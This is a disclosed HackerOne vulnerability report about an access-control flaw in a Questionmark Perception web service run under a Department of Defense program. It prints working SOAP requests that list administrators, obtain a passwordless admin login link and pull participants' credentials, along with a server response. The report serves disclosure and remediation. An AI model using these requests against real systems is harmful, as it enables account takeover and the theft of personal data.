---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1026146'
original_report_id: '1026146'
title: Unauthorized access to admin panel of the Questionmark Perception system at
  https://██████████
weakness: Improper Access Control - Generic
team_handle: deptofdefense
created_at: '2020-11-04T18:35:21.036Z'
disclosed_at: '2021-06-30T20:41:48.260Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- improper-access-control-generic
---

# Unauthorized access to admin panel of the Questionmark Perception system at https://██████████

## Metadata

- HackerOne Report ID: 1026146
- Weakness: Improper Access Control - Generic
- Program: deptofdefense
- Disclosed At: 2021-06-30T20:41:48.260Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Due to the lack of access control, an anonymous attacker can compromise the administrator account on the Questionmark Perception system.

**Description:**
By using the service description which publicly accessible on the internet, and by bypassing the access control, an anonymous attacker can (ab)use the method provided by the system and get the administrator access on the Questionmark Perception system.

## Step-by-step Reproduction Instructions
- Visit https://██████/█████████ to get all the Questionmark Web Integration Services' description.
████

- The method **GetAdministratorList** returns a list giving the full details of all the administrators in the database, as described in https://███████/███?████

████████

- Issuing the request shown above, but remove all the code between the <soapenv:Header> and the </soapenv:Header> tag like the request below:

```
POST /███ HTTP/1.1
Host: ████
Content-Type: text/xml; charset=utf-8
Content-Length: 328
SOAPAction: "http://questionmark.com/QMWISe/GetAdministratorList"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetAdministratorList xmlns="http://questionmark.com/QMWISe/" />
  </soap:Body>
</soap:Envelope>
```
- The response shows us a list giving the full details of all the administrators in the database, included `Administrator_ID`, `Administrator_Name`, `Email`,...

█████

- The method **GetAccessAdministrator** processes an Administrator Name and returns a URL that enables the administrator to log in to Enterprise Manager (without using a password) if the administrator exists, so using the information we got above, we can (ab)use this method to get access to an administrator account.

```
POST /███████ HTTP/1.1
Host: ██████████
Content-Type: text/xml; charset=utf-8
Content-Length: 416
SOAPAction: "http://questionmark.com/QMWISe/GetAccessAdministrator"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetAccessAdministrator xmlns="http://questionmark.com/QMWISe/">
      <Administrator_Name>au_eliut</Administrator_Name>
    </GetAccessAdministrator>
  </soap:Body>
</soap:Envelope>
```
- The response gives us a link to login without using a password.

```
HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: text/xml; charset=utf-8
Server: 0
X-AspNet-Version: 2.0.50727
Strict-Transport-Security: max-age=63072000;includeSubDomains;preload
Date: Wed, 04 Nov 2020 18:18:46 GMT
Content-Length: 565
Set-Cookie: BIGipServer██████████████ path=/; Httponly; Secure

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><GetAccessAdministratorResponse xmlns="http://questionmark.com/QMWISe/"><URL>https://█████████/em5/exlogin.asp?CustomerID=AuthoringRepository&amp;USER=au_eliut&amp;EXPIRY=04:11:2020:13:18&amp;CHECKSUM=db69772f40b1a71179fd96e1bceebed003f3049e03a78e7d009c4627d387da2c</URL></GetAccessAdministratorResponse></soap:Body></soap:Envelope>

```
██████████
- Using the link above: `https://██████████/████████` to login as admin.

████████

## Suggested Mitigation/Remediation Actions
- Remove the service description at https://██████/█████████
- Re-configure the system, to deny all the request without the SOAP "Trust" header.

## Impact

Incorrect access restriction to the authorized interface of the site leads to information leakage. [As Questionmark describes,](https://support.questionmark.com/content/web-services) an admin can view all fields of the questions, the results, and personal information of the participants.

For example, issuing the request below to get all the participants' information such as username, password,...

```
POST /██████ HTTP/1.1
Host: ███████
Content-Type: text/xml; charset=utf-8
Content-Length: 326
SOAPAction: "http://questionmark.com/QMWISe/GetParticipantList"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetParticipantList xmlns="http://questionmark.com/QMWISe/" />
  </soap:Body>
</soap:Envelope>
```

█████

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
